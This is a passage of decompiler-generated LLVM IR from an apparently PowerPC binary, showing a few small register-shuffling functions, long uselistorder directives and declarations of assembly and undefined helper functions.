  %v0_1000a6b4 = phi i32 [ %v0_1000a688, %dec_label_pc_1000a670 ], [ -1, %dec_label_pc_1000a698 ]
  ret i32 %v0_1000a6b4

; uselistorder directives
  uselistorder i32 268435456, { 31, 14, 34, 21, 35, 36, 37, 38, 22, 23, 39, 40, 15, 20, 28, 41, 16, 29, 24, 25, 17, 42, 32, 26, 33, 27, 30, 18, 43, 44, 19, 2, 0, 1, 5, 3, 4, 6, 9, 7, 8, 12, 10, 11, 13 }
  uselistorder i32 ()* @__asm_mfcr, { 14, 43, 11, 35, 10, 9, 8, 7, 34, 33, 6, 5, 4, 42, 36, 18, 3, 41, 17, 32, 31, 40, 2, 13, 20, 12, 19, 16, 39, 1, 0, 38, 37, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 15 }
  uselistorder label %dec_label_pc_1000a6a4, { 1, 0 }
}

define i32 @function_1000a6b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a6b8:
  store i32 %arg1, i32* @r29, align 4
  %v0_1000a6cc = call i32 @function_10008484()
  %v0_1000a6d0 = load i32, i32* @r29, align 4
  %v2_1000a6d0 = inttoptr i32 %v0_1000a6cc to i32*
  store i32 %v0_1000a6d0, i32* %v2_1000a6d0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ()* @function_10008484, { 25, 18, 54, 15, 37, 14, 13, 12, 11, 36, 35, 34, 10, 9, 0, 8, 7, 40, 39, 23, 24, 53, 52, 51, 50, 33, 32, 31, 49, 38, 20, 6, 5, 48, 19, 30, 29, 47, 3, 17, 27, 16, 26, 4, 46, 2, 1, 45, 44, 43, 42, 41, 28, 22, 21 }
  uselistorder i32* @r29, { 203, 204, 216, 11, 12, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 217, 218, 219, 220, 221, 0, 38, 205, 206, 207, 208, 190, 191, 192, 1, 193, 194, 209, 210, 211, 212, 214, 215, 13, 14, 15, 58, 59, 60, 61, 62, 63, 64, 2, 29, 30, 31, 3, 32, 33, 34, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 35, 36, 37, 39, 40, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 4, 107, 5, 108, 6, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 7, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 8, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 9, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 196, 195, 197, 198, 199, 10, 200, 201, 202, 213 }
}

define i32 @function_1000a6ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a6ec:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001b108.388 to i32), i32* %r31.global-to-local, align 4
  %v3_1000a708 = load i32, i32* @global_var_1001b108.388, align 4
  %v3_1000a70c = icmp eq i32 %v3_1000a708, -1
  br i1 %v3_1000a70c, label %dec_label_pc_1000a728, label %dec_label_pc_1000a714

dec_label_pc_1000a714:                            ; preds = %dec_label_pc_1000a6ec, %dec_label_pc_1000a714
  %v0_1000a714 = phi i32 [ %v3_1000a71c, %dec_label_pc_1000a714 ], [ %v3_1000a708, %dec_label_pc_1000a6ec ]
  call void @__pseudo_call(i32 %v0_1000a714)
  %v0_1000a71c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a71c = add i32 %v0_1000a71c, -4
  %v2_1000a71c = inttoptr i32 %v1_1000a71c to i32*
  %v3_1000a71c = load i32, i32* %v2_1000a71c, align 4
  store i32 %v1_1000a71c, i32* %r31.global-to-local, align 4
  %v3_1000a720 = icmp eq i32 %v3_1000a71c, -1
  br i1 %v3_1000a720, label %dec_label_pc_1000a728, label %dec_label_pc_1000a714

dec_label_pc_1000a728:                            ; preds = %dec_label_pc_1000a714, %dec_label_pc_1000a6ec
  %v0_1000a738 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a738

; uselistorder directives
  uselistorder i32 %v3_1000a71c, { 1, 0 }
  uselistorder i32 -4, { 0, 4, 5, 6, 7, 8, 9, 18, 19, 10, 11, 12, 13, 14, 15, 16, 17, 3, 1, 2 }
  uselistorder void (i32)* @__pseudo_call, { 1, 4, 5, 2, 3, 0 }
  uselistorder i32 -1, { 135, 136, 0, 38, 92, 319, 12, 13, 14, 320, 93, 321, 10, 11, 39, 40, 224, 77, 41, 184, 42, 43, 44, 45, 46, 185, 186, 187, 188, 189, 190, 47, 332, 330, 48, 322, 323, 78, 94, 324, 17, 18, 95, 329, 15, 16, 174, 3, 79, 225, 226, 33, 137, 328, 325, 49, 138, 96, 139, 19, 20, 140, 141, 142, 36, 50, 143, 144, 97, 98, 99, 100, 227, 228, 21, 22, 23, 101, 229, 230, 102, 103, 104, 24, 105, 80, 76, 191, 192, 51, 52, 53, 54, 326, 327, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 331, 69, 145, 106, 25, 231, 232, 107, 108, 1, 109, 110, 146, 70, 71, 111, 2, 112, 26, 113, 72, 114, 27, 233, 163, 75, 4, 164, 165, 115, 28, 166, 167, 168, 169, 170, 116, 37, 147, 81, 148, 83, 149, 150, 82, 151, 152, 153, 154, 155, 84, 156, 157, 158, 73, 159, 160, 117, 29, 118, 30, 161, 5, 119, 162, 171, 74, 172, 173, 120, 121, 122, 123, 124, 175, 176, 177, 178, 179, 180, 181, 182, 183, 34, 35, 193, 194, 195, 196, 197, 125, 126, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 6, 214, 7, 215, 216, 8, 217, 9, 218, 219, 127, 128, 220, 129, 221, 130, 131, 222, 223, 132, 234, 235, 86, 85, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 88, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 87, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 133, 31, 134, 32, 318, 89, 90, 91 }
  uselistorder i32 1, { 117, 424, 923, 540, 541, 610, 609, 342, 338, 341, 340, 337, 339, 613, 612, 611, 207, 0, 821, 822, 823, 824, 471, 6, 15, 16, 18, 19, 17, 97, 343, 614, 258, 259, 148, 301, 418, 419, 616, 615, 401, 400, 402, 398, 397, 399, 396, 403, 542, 119, 120, 122, 121, 617, 139, 302, 543, 618, 10, 8, 7, 9, 544, 498, 927, 924, 622, 621, 620, 619, 146, 144, 141, 145, 143, 142, 545, 926, 623, 749, 750, 751, 539, 752, 472, 53, 54, 56, 55, 57, 251, 252, 253, 31, 32, 34, 35, 33, 100, 452, 624, 410, 925, 417, 546, 547, 627, 626, 625, 135, 132, 133, 134, 131, 136, 130, 499, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 713, 642, 641, 394, 644, 643, 37, 36, 38, 932, 933, 249, 247, 250, 248, 91, 92, 87, 90, 89, 88, 928, 929, 930, 931, 423, 422, 421, 645, 548, 646, 21, 20, 22, 549, 647, 128, 129, 500, 648, 23, 99, 395, 415, 305, 303, 138, 137, 125, 98, 649, 304, 123, 408, 416, 409, 414, 118, 650, 147, 651, 178, 714, 652, 206, 835, 836, 443, 444, 456, 837, 838, 451, 839, 655, 654, 653, 45, 39, 42, 43, 46, 44, 41, 40, 1, 840, 841, 842, 843, 844, 2, 846, 845, 847, 848, 849, 850, 433, 851, 852, 657, 656, 760, 761, 762, 550, 763, 11, 12, 13, 14, 853, 854, 474, 473, 855, 260, 856, 858, 857, 551, 859, 445, 413, 412, 411, 825, 126, 127, 860, 861, 446, 447, 457, 862, 27, 24, 26, 25, 863, 425, 426, 427, 428, 429, 430, 431, 432, 864, 93, 96, 95, 94, 865, 83, 86, 85, 84, 28, 29, 455, 729, 730, 734, 731, 737, 732, 434, 435, 733, 453, 436, 437, 448, 438, 439, 735, 736, 454, 440, 441, 449, 738, 552, 739, 740, 553, 741, 742, 743, 746, 747, 744, 745, 458, 748, 501, 665, 664, 663, 662, 661, 603, 660, 659, 658, 116, 114, 113, 109, 112, 108, 106, 103, 101, 102, 104, 110, 107, 115, 111, 105, 805, 554, 459, 407, 405, 406, 404, 715, 718, 716, 717, 555, 666, 61, 58, 59, 66, 71, 72, 70, 65, 64, 63, 60, 62, 69, 68, 67, 503, 719, 720, 502, 721, 556, 557, 558, 723, 724, 722, 475, 725, 559, 560, 561, 726, 562, 727, 490, 728, 563, 679, 678, 677, 604, 676, 607, 675, 674, 673, 672, 671, 670, 669, 668, 667, 47, 50, 51, 49, 52, 48, 420, 564, 505, 504, 476, 681, 680, 565, 481, 753, 569, 566, 754, 567, 755, 568, 756, 757, 758, 450, 570, 759, 571, 572, 491, 692, 691, 690, 689, 688, 687, 686, 685, 684, 683, 682, 77, 81, 82, 73, 74, 75, 79, 78, 76, 80, 764, 573, 765, 766, 767, 768, 769, 4, 477, 770, 771, 3, 772, 773, 774, 775, 695, 694, 605, 606, 693, 150, 149, 806, 809, 807, 478, 808, 124, 810, 811, 812, 574, 575, 776, 777, 778, 576, 460, 492, 779, 697, 696, 370, 368, 379, 387, 388, 381, 389, 383, 374, 392, 384, 380, 390, 391, 382, 385, 376, 386, 373, 372, 371, 367, 369, 393, 378, 377, 375, 780, 508, 781, 782, 506, 783, 577, 578, 507, 698, 298, 289, 287, 299, 297, 300, 291, 294, 295, 296, 290, 293, 292, 288, 784, 785, 786, 787, 579, 461, 493, 788, 509, 510, 699, 203, 197, 186, 201, 204, 189, 187, 183, 198, 181, 182, 192, 193, 194, 179, 180, 205, 188, 202, 200, 191, 185, 199, 196, 195, 190, 184, 789, 790, 791, 580, 462, 494, 792, 511, 512, 513, 700, 271, 268, 272, 282, 262, 264, 274, 273, 285, 275, 269, 283, 284, 279, 280, 281, 277, 270, 278, 276, 286, 267, 266, 265, 263, 793, 794, 795, 796, 581, 463, 495, 797, 514, 515, 516, 517, 518, 704, 703, 702, 701, 352, 347, 356, 362, 345, 349, 359, 350, 360, 357, 361, 363, 364, 365, 353, 348, 346, 366, 358, 351, 355, 354, 344, 798, 799, 800, 802, 803, 801, 464, 496, 804, 519, 520, 521, 705, 166, 153, 164, 173, 152, 151, 168, 176, 171, 169, 162, 154, 170, 174, 175, 158, 159, 167, 165, 172, 155, 177, 163, 161, 160, 156, 157, 813, 814, 815, 817, 818, 816, 465, 497, 819, 522, 523, 524, 710, 709, 708, 707, 706, 235, 222, 233, 242, 221, 220, 237, 238, 245, 240, 231, 223, 234, 239, 243, 244, 227, 228, 236, 241, 224, 246, 232, 230, 229, 225, 226, 5, 525, 526, 527, 528, 529, 530, 531, 820, 532, 256, 255, 254, 257, 466, 261, 467, 140, 826, 582, 830, 583, 831, 827, 828, 829, 832, 833, 211, 215, 219, 208, 218, 209, 214, 213, 212, 210, 217, 216, 834, 584, 468, 30, 866, 867, 533, 868, 869, 479, 870, 871, 442, 482, 589, 483, 484, 588, 485, 592, 486, 872, 534, 487, 590, 488, 489, 591, 480, 873, 874, 587, 875, 876, 877, 878, 879, 880, 600, 601, 881, 882, 883, 884, 885, 886, 887, 888, 889, 586, 890, 891, 892, 893, 894, 895, 593, 594, 595, 896, 897, 898, 899, 900, 901, 596, 902, 903, 904, 905, 597, 906, 907, 908, 909, 598, 910, 599, 911, 912, 913, 469, 585, 535, 914, 915, 470, 536, 537, 916, 917, 918, 602, 919, 920, 921, 922, 538, 712, 711, 328, 334, 319, 310, 333, 327, 325, 320, 321, 322, 311, 324, 326, 312, 323, 313, 314, 315, 316, 317, 318, 332, 336, 335, 307, 331, 330, 329, 309, 308, 306, 608 }
  uselistorder label %dec_label_pc_1000a714, { 1, 0 }
}

define i32 @function_1000a73c() local_unnamed_addr {
dec_label_pc_1000a73c:
  %v0_1000a754 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a754

; uselistorder directives
  uselistorder i32* @r3, { 10, 11, 227, 228, 229, 12, 114, 0, 115, 31, 237, 19, 18, 3, 24, 230, 232, 30, 233, 234, 235, 166, 29, 167, 8, 15, 168, 173, 172, 231, 82, 174, 83, 84, 175, 25, 17, 20, 236, 116, 117, 118, 119, 120, 121, 122, 123, 124, 14, 27, 4, 16, 176, 1, 2, 5, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 95, 96, 28, 97, 98, 99, 13, 156, 157, 158, 9, 159, 160, 6, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 100, 23, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 161, 162, 7, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 163, 164, 165, 177, 169, 170, 171, 178, 179, 180, 181, 183, 184, 182, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 21, 22, 26 }
}

define i32 @function_1000a758() local_unnamed_addr {
entry:
  store i32 268478312, i32* @lr, align 4
  %v0_1000a764 = call i32 @function_100000b8()
  ret i32 %v0_1000a764

; uselistorder directives
  uselistorder i32 0, { 910, 208, 911, 43, 209, 154, 914, 210, 915, 916, 41, 42, 917, 918, 919, 69, 920, 0, 652, 653, 654, 85, 84, 655, 508, 211, 212, 401, 680, 681, 155, 682, 921, 21, 509, 510, 922, 923, 924, 925, 213, 511, 512, 513, 514, 515, 516, 517, 86, 518, 519, 926, 927, 214, 945, 946, 215, 951, 960, 146, 961, 216, 952, 1, 928, 929, 87, 930, 931, 217, 156, 218, 932, 933, 46, 47, 934, 935, 936, 219, 939, 940, 941, 44, 45, 942, 943, 944, 477, 478, 479, 480, 481, 88, 482, 483, 484, 206, 485, 89, 685, 687, 24, 688, 48, 689, 686, 683, 684, 2, 644, 640, 641, 642, 643, 147, 3, 692, 690, 691, 148, 693, 694, 645, 646, 647, 648, 649, 220, 650, 651, 659, 660, 221, 661, 157, 695, 704, 705, 90, 696, 697, 698, 699, 700, 701, 702, 703, 4, 5, 397, 402, 403, 404, 49, 50, 405, 6, 222, 656, 406, 407, 408, 409, 410, 411, 412, 413, 223, 414, 962, 963, 964, 965, 966, 967, 968, 969, 706, 707, 51, 708, 709, 710, 711, 712, 953, 954, 955, 52, 956, 957, 958, 959, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 415, 486, 713, 937, 938, 416, 714, 532, 533, 417, 947, 91, 948, 912, 676, 913, 677, 715, 418, 949, 950, 419, 420, 716, 717, 718, 53, 92, 719, 720, 207, 721, 723, 722, 152, 7, 724, 71, 25, 72, 26, 725, 726, 8, 73, 27, 74, 28, 727, 75, 728, 29, 30, 729, 76, 31, 93, 224, 225, 22, 23, 534, 730, 731, 732, 733, 97, 95, 94, 734, 96, 99, 98, 735, 100, 736, 54, 737, 738, 739, 662, 101, 663, 664, 740, 741, 55, 102, 742, 9, 103, 743, 104, 744, 79, 457, 458, 32, 226, 77, 33, 34, 227, 78, 35, 459, 10, 161, 160, 460, 461, 462, 463, 464, 465, 159, 158, 466, 56, 57, 467, 468, 228, 105, 469, 470, 106, 471, 107, 472, 108, 473, 474, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 153, 431, 432, 433, 229, 434, 435, 436, 437, 438, 439, 440, 441, 162, 442, 443, 58, 59, 444, 445, 446, 60, 61, 447, 448, 449, 11, 450, 451, 110, 109, 452, 453, 454, 112, 111, 455, 230, 231, 456, 475, 163, 476, 488, 114, 487, 113, 489, 490, 116, 491, 115, 492, 493, 118, 494, 117, 495, 496, 120, 497, 119, 498, 499, 122, 500, 121, 501, 12, 232, 233, 20, 504, 502, 503, 149, 505, 506, 164, 234, 507, 36, 535, 546, 536, 13, 537, 538, 539, 540, 150, 541, 542, 543, 544, 545, 37, 123, 68, 67, 124, 547, 62, 237, 548, 235, 236, 165, 549, 81, 621, 622, 80, 623, 125, 624, 82, 625, 126, 127, 550, 238, 551, 552, 553, 554, 239, 555, 556, 557, 167, 166, 558, 240, 559, 131, 130, 560, 561, 38, 129, 128, 562, 563, 564, 39, 565, 566, 567, 568, 132, 168, 569, 133, 570, 241, 571, 572, 573, 242, 574, 575, 576, 577, 243, 578, 579, 580, 169, 170, 171, 172, 173, 174, 175, 176, 581, 582, 134, 583, 584, 244, 585, 586, 587, 588, 589, 590, 245, 591, 592, 593, 185, 177, 178, 179, 180, 181, 182, 183, 184, 135, 594, 595, 246, 596, 597, 598, 599, 602, 603, 247, 601, 600, 248, 604, 605, 606, 186, 187, 188, 189, 190, 191, 192, 607, 136, 608, 249, 609, 610, 611, 612, 613, 614, 615, 616, 617, 250, 618, 619, 620, 193, 194, 195, 196, 626, 137, 627, 251, 628, 629, 630, 631, 632, 633, 634, 635, 636, 252, 637, 638, 639, 197, 198, 199, 200, 745, 746, 657, 658, 665, 70, 666, 667, 253, 668, 669, 670, 671, 672, 673, 674, 675, 678, 40, 679, 747, 256, 752, 753, 754, 755, 749, 750, 751, 748, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 257, 772, 773, 774, 775, 254, 776, 777, 151, 778, 779, 83, 138, 780, 781, 782, 783, 784, 785, 786, 787, 140, 788, 789, 790, 791, 792, 793, 806, 807, 808, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 809, 260, 810, 811, 812, 813, 814, 139, 815, 816, 817, 818, 255, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 258, 843, 844, 845, 846, 847, 848, 849, 850, 259, 851, 852, 853, 854, 855, 856, 857, 858, 143, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 141, 876, 878, 877, 879, 880, 881, 882, 883, 201, 142, 884, 885, 886, 887, 202, 888, 261, 262, 889, 890, 891, 892, 893, 63, 64, 894, 895, 65, 66, 896, 897, 145, 898, 144, 899, 900, 901, 263, 902, 903, 904, 905, 906, 907, 908, 203, 909, 204, 205, 970, 971, 972, 19, 18, 17, 16, 15, 14, 398, 399, 400, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991 }
  uselistorder i32* @lr, { 7, 559, 702, 703, 707, 708, 709, 710, 711, 712, 539, 109, 303, 304, 8, 560, 561, 305, 306, 307, 308, 309, 310, 721, 722, 726, 727, 728, 729, 730, 731, 733, 735, 723, 725, 713, 714, 715, 716, 717, 718, 719, 720, 562, 564, 563, 516, 517, 518, 519, 520, 521, 542, 543, 544, 565, 569, 566, 567, 568, 110, 111, 704, 705, 706, 570, 571, 494, 572, 446, 573, 238, 574, 112, 575, 383, 113, 540, 114, 115, 116, 117, 118, 119, 120, 734, 732, 121, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 724, 122, 123, 124, 125, 126, 127, 325, 576, 577, 545, 578, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 579, 580, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 0, 257, 258, 259, 260, 261, 262, 263, 264, 265, 282, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 2, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 3, 354, 355, 356, 357, 358, 359, 1, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 384, 386, 387, 388, 385, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 581, 541, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 582, 583, 584, 585, 588, 589, 590, 591, 586, 587, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 607, 606, 4, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 5, 6 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr
